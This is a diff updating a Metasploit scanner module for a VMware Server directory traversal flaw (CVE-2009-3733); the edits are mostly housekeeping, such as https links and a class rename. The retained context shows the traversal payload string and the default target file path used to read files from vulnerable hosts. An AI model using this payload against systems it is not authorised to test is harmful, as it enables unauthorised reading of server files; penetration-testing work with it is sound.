@@ -1,11 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   # Exploit mixins should be called first
   include Msf::Exploit::Remote::HttpClient
@@ -26,7 +24,7 @@ class Metasploit3 < Msf::Auxiliary
       'License'     => MSF_LICENSE,
       'References'	=>
         [
-          [ 'URL', 'http://www.vmware.com/security/advisories/VMSA-2009-0015.html' ],
+          [ 'URL', 'https://www.vmware.com/security/advisories/VMSA-2009-0015.html' ],
           [ 'OSVDB', '59440' ],
           [ 'BID', '36842' ],
           [ 'CVE', '2009-3733' ],
@@ -38,7 +36,7 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(8222),
         OptString.new('FILE', [ true,  "The file to view", '/etc/vmware/hostd/vmInventory.xml']),
         OptString.new('TRAV', [ true,  "Traversal Depth", '/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E']),
-      ], self.class)
+      ])
   end
 
   def run_host(target_host)
@@ -59,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
 
       if res.code == 200
         #print_status("Output Of Requested File:\n#{res.body}")
-        print_status("#{target_host}:#{rport} appears vulnerable to VMWare Directory Traversal Vulnerability")
+        print_good("#{target_host}:#{rport} appears vulnerable to VMWare Directory Traversal Vulnerability")
         report_vuln(
           {
             :host   => target_host,
@@ -80,5 +78,4 @@ class Metasploit3 < Msf::Auxiliary
     rescue ::Timeout::Error, ::Errno::EPIPE
     end
   end
-
 end
